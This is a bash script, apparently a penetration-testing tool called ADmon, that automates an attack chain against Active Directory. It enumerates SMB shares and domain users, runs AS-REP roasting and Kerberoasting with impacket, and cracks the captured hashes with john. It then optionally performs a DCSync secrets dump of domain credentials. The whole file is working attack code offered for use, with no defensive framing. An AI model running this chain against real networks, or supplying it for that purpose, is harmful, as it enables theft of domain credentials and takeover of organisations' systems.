#!/bin/bash
#color
END="\e[0m"
RED="31"
GREEN="32"
GREENJ="\e[${GREEN}m"
BOLDGREEN="\e[1;${GREEN}m"
BOLDRED="\e[1;${RED}m"
ITALICRED="\e[3;${RED}m"
YELLOW="\033[0;33m"
Cyan="\e[0;36m"
white="\e[0;37m"
#echo "hello digimon you are a great man!" 
echo -e "
${BOLDGREEN}
     **     *******   ****     ****   *******   ****     **
    ****   /**////** /**/**   **/**  **/////** /**/**   /**
   **//**  /**    /**/**//** ** /** **     //**/**//**  /**
  **  //** /**    /**/** //***  /**/**      /**/** //** /**
 **********/**    /**/**  //*   /**/**      /**/**  //**/**
/**//////**/**    ** /**   /    /**//**     ** /**   //****
/**     /**/*******  /**        /** //*******  /**    //***
//      // ///////   //         //   ///////   //      /// 

                                                        github: 0xDigimon
                                                        by Abdelmawla Elamrosy${END}"


words=("srvinfo" "enumdomusers" "querydispinfo")
username=""
domain=""
ip=""
password=""
help=""
nopass=""
#printf "Are you have username & and password [Y/n]: "
#read -r d
while getopts u:d:i:p:h:N flag
do
    case "${flag}" in
        u) username=${OPTARG};;
        d) domain=${OPTARG};;
        i) ip=${OPTARG};;
        p) password=${OPTARG};;
        h) help=${OPTARG};;
        N) nopass=${OPTARG};;
        \?) echo "Invalid -$OPTARG">&2
            echo "use -h for help"
            exit 1 ;;
        : ) echo "Missing argument for -$OPTARG use -h for help";;
    esac
done
#
#
#Enumeration
#
#
if [[(-n "$ip")]];
then
    
    echo -e "${BOLDGREEN}Wait 5s and Press Enter${END}"
    crackmapexec smb $ip > dom
    echo -e "${ITALICRED}$ip${END}"
    if [[($(wc -l < dom) -ne 0 )]]
    then 
    cat dom | cut -d "(" -f 3 | cut -d ":" -f 2 | cut -d ")" -f 1 > domain.txt
    if [[($(wc -l < domain.txt) -ne 0 )]]
    then
    file="domain.txt"
    while read -r line; do
    domain=$line
    done <$file
    else
    echo -e "${BOLDRED}can't get Domain check on dom file format and edit in line 65${END}"
    fi
    fi
    if [[(-n "$username")]]
    then
        echo -e "${ITALICRED}$username${END}"
        if [[(-n "$domain")]]
        then
        echo -e "${ITALICRED}$domain${END}"  
            if [[(-n "$password")]]
            then 
            echo -e "${ITALICRED}$password${END}"
                smbclient -L $ip -U "$domain\\$username" --password $password > smbclient
                if [[($(wc -l < smbclient) -lt 2 )]]
                then
                rm smbclient
                else 
                echo -e "${BOLDGREEN} try smbclient -L $ip -U "$domain\\$username" --password $password to discover shares files${END}"
                fi
                for item in "${words[@]}"
                do
                    rpcclient $ip -U "$domain\\$username" --password $password -c $item > $item
                    if [[($(wc -l < $item) -le 1 )]]
                    then
                    rm $item
                    else 
                    cat enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt
                    fi
                done
            else 
                smbclient -L $ip -U "$domain\\$username" -N > smbclient
                
                if [[($(wc -l < smbclient) -lt 2 )]]
                then
                rm smbclient
                else 
                echo -e "${BOLDGREEN}try smbclient -L $ip -U "$domain\\$username" -N to discover shares files${END}"
                fi
                for item in "${words[@]}"
                do
                    rpcclient $ip -U "$domain\\$username" -N -c $item > $item
                    
                    if [[($(wc -l < $item) -le 2 )]]
                    then
                    rm $item
                    else 
                    cat enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt
                    fi
                done
            fi
        else 
            if [[(-n "$password")]]
            then
                smbclient -L $ip -U "$username" --password $password > smbclient
                if [[($(wc -l < smbclient) -lt 2 )]]
                then
                rm smbclient
                else 
                echo -e "${BOLDGREEN}try smbclient -L $ip -U "$username" --password $password to discover shares files${END}"
                fi
            for item in "${words[@]}"
            do
                rpcclient $ip -U "$username" --password $password -c $item > $item
                if [[($(wc -l < $item) -le 1 )]]
                then
                rm $item
                else 
                cat enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt
                fi
            done
            else
                smbclient -L $ip -U "$username" -N > smbclient
                if [[($(wc -l < smbclient) -lt 3 )]]
                then
                rm smbclient
                else 
                echo -e "${BOLDGREEN}try smbclient -L $ip -U "$username" -N to discover shares files${END}"
                fi
            for item in "${words[@]}"
            do
                rpcclient $ip -U "$username" -N -c $item > $item
                if [[($(wc -l < $item) -le 1 )]]
                then
                rm $item
                else 
                cat enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt
                fi
            done
            
            fi
        fi
    else 
        smbclient -L $ip -N $password > smbclient
        if [[($(wc -l < smbclient) -lt 2 )]]
        then
        rm smbclient
        else 
        echo -e "${BOLDGREEN}try smbclient -L $ip -N to discover shares files${END}"
        fi
    for item in "${words[@]}"
    do
        rpcclient $ip -U "" -N -c $item > $item
        if [[($(wc -l < $item) -le 1 )]]
        then
        rm $item
        else 
        cat enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt
        fi
    done
    
    fi

else 
echo -e "\n${BOLDRED}Invalid input, Must have IP${END}"
echo -e "${BOLDGREEN}Usage ./ADmon.sh -i <ip> [options: -u username -p password -d domain] ${END}"
exit 1;
fi

#
#
#Attacks
#
#
#
#
#

if [[(-f users.txt)]]
then
    if [[($(wc -l < users.txt) -gt 5 )]]
        then
        #
        #
        #AS-REP-Roasting
        #
        #
        echo -e "${BOLDGREEN}Start AS-REP-Roasting Attack${END}"
        if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip" )]]
        then
        impacket-GetNPUsers -dc-ip $ip $domain/$username:$password > NPUsers.txt
        impacket-GetNPUsers -dc-ip $ip $domain/$username:$password -request > tgt
        fi
        impacket-GetNPUsers -user users.txt  -dc-ip $ip $domain/ >> tgt
        cat tgt | grep "\$krb5asrep" > tgt.hash
        john --wordlist=/usr/share/wordlists/rockyou.txt tgt.hash > pass.txt 
        cat pass.txt | grep "\$k" > tgtpassords.txt
        cat tgtpassords.txt | sort -u > tgtpasswords.txt
        rm tgt pass.txt tgtpassords.txt
        cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
        cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt

        if [[($(wc -l < passwordmon.txt) -le 1 && $(wc -l < usermon.txt) -le 1)]]
        then
        echo -e "${BOLDRED}Failed AS-REP-Roasting Attack${END}"
        rm usermon.txt passwordmon.txt tgt.hash tgtpasswords.txt
        fi
        #
        #
        #
        #Start Kerberoasting Attack
        #
        #
        #
        echo -e "${BOLDGREEN}Start Kerberoasting Attack${END}"
        #
        #from user input
        #

        if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip" )]]
        then 
            echo -e "${GREENJ}username:$username${END}" 
            echo -e "${GREENJ}password:$password${END}"
            impacket-GetUserSPNs $domain/$username:$password -dc-ip $ip > SPNUsers
            impacket-GetUserSPNs $domain/$username:$password -dc-ip $ip -request > tgs.hash

        fi

        #
        #from files
        #
        if [[(-f passwordmon.txt && -f usermon.txt)]]
        then
        two_lines_operation ()
        {
            echo -e "${GREENJ}username:${1}${END}" 
            echo -e "${GREENJ}password:${2}${END}" 
            impacket-GetUserSPNs $domain/${1}:${2} -dc-ip $ip >> SPNUsers
        }
        countA=0
        while read user
        do
            countB=0
            while read pass
            do
                if [ "$countA" -eq "$countB" ]
                then
                    two_lines_operation "$user" "$pass"
                    break
                fi
                countB=`expr $countB + 1`
                done < passwordmon.txt
            countA=`expr $countA + 1`
        done < usermon.txt
        fi
        cat SPNUsers| grep "/" |sort -u > SPNUsers.txt
        rm SPNUsers
        if [[($(wc -l < SPNUsers.txt) -ge 1)]]
        then
        echo -e "${BOLDGREEN}try to get tgs hash\nimpacket-GetUserSPNs <domain/username:password> -dc-ip ip -request${END}"
        else
        echo -e "${BOLDRED}Failed Kerberoasting Attack${END}"
        rm SPNUsers.txt
        fi



            if [[(-f passwordmon.txt && -f usermon.txt)]]
            then
                if [[($(wc -l < passwordmon.txt) -gt 2 && $(wc -l < usermon.txt) -gt 2)||(-n "$username" && -n "$password" && -n "$domain" && -n "$ip")]]
                then
                #printf "do you want try dc-sync attack [N/y]: "
                #read dc
                #
                #
                #start dc sync attack
                #
                #
                #

                read -p $'\e[31mDo you try dc-sync attack (secret dump)? (N/y)\e[0m ' -n 1;
                echo 

                    if [[($REPLY =~ ^[Yy]$)]]
                    then 
                        if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip" )]]
                        then 
                            echo -e "${GREENJ}username:$username${END}" 
                            echo -e "${GREENJ}password:$password${END}"
                            impacket-secretsdump $domain/$username:$password@$ip > $username.secretDump
                            if [[($(wc -l < $username.secretDump) -le 10)]]
                            then
                            rm $username.secretDump
                            fi
                        fi
                        two_lines_operation ()
                            {
                                echo -e "${GREENJ}username:${1}${END}" 
                                echo -e "${GREENJ}password:${2}${END}" 
                                impacket-secretsdump $domain/${1}:${2}@$ip >${1}.secretDump
                                if [[($(wc -l < ${1}.secretDump) -le 10)]]
                                then
                                rm ${1}.secretDump
                                fi

                            }
                        countA=0
                        while read name
                        do
                            countB=0
                            while read pas
                            do
                                if [ "$countA" -eq "$countB" ]
                                then
                                    two_lines_operation "$name" "$pas"
                                    break
                                fi
                                countB=`expr $countB + 1`
                            done < passwordmon.txt
                            countA=`expr $countA + 1`
                        done < usermon.txt
                        echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
                        rm usermon.txt passwordmon.txt
                    else 
                    echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
                    rm usermon.txt passwordmon.txt
                    exit 1;
                    fi
                fi
            else
                if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip")]]
                    then
                    #printf "do you want try dc-sync attack [N/y]: "
                    #read dc
                    #
                    #
                    #start dc sync attack
                    #
                    #
                    #

                    read -p $'\e[31mDo you try dc-sync attack (secret dump)? (N/y)\e[0m ' -n 1;
                    echo 

                    if [[($REPLY =~ ^[Yy]$)]]
                    then 
                        if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip" )]]
                        then 
                            echo -e "${GREENJ}username:$username${END}" 
                            echo -e "${GREENJ}password:$password${END}"
                            impacket-secretsdump $domain/$username:$password@$ip > $username.secretDump
                            if [[($(wc -l < $username.secretDump) -le 10)]]
                            then
                            rm $username.secretDump
                            fi
                        fi
                        echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
                        exit 1;
                    else 
                    echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
                    exit 1;
                    fi
                fi
            fi
    fi
fi